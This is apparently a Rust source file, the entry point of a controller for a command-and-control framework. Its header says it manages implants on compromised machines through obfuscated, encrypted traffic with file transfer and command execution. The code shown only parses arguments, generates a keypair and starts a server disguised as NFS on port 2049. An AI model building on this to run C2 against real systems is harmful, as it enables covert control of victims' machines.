/* smokeless_flame - controller/src/main.rs
*
*   Purpose: Act as the controller/server for implants on compromised machines. Ideas are taken from my NFS implementation.
*            This will be a custom implementation that uses encryption and authentication to ensure secure and obfuscate communication.
*            The controller will manage multiple implants and allow for file transfers, command execution, and other features.
*            This will use a custom protocol over TCP, with optional TLS for added security.
*
*   Author: Mauzy0x00
*   Start Date: 10-14-2025
*
*   File Description: This is the main function of the controller. Supporting functions and loops will be called here
*/

use lib::async_io;
use lib::encryption;
use lib::error;
use lib::protocol;

mod filesystem;
mod server;
// mod filesystem_linux;
// mod filesystem_windows;

use clap::Parser;
use smol::{io, net, prelude::*, Unblock};
use std::path::PathBuf;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Turn on verbose logging
    #[arg(short, long)]
    verbose: Option<bool>,

    /// Directory to export
    #[arg(short, long)]
    export_path: PathBuf,

    /// Address to bind to
    #[arg(short, long, default_value = "0.0.0.0:2049")]
    bind_address: String,
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();

    // Initialize logger
    if let Some(true) = cli.verbose {
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("debug")).init();
    } else {
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    }

    // Generate encryption keypair
    let keypair = encryption::KeyPair::generate();

    match cli {
        Cli {
            verbose,
            export_path,
            bind_address,
        } => {
            log::info!(
                "Starting NFS server, exporting {} on {}",
                export_path.display(),
                bind_address
            );

            // Create and run server
            let server = server::NfsServer::new(export_path, bind_address, keypair)?;

            smol::block_on(server.run())?;
        }
    }
    Ok(())
}
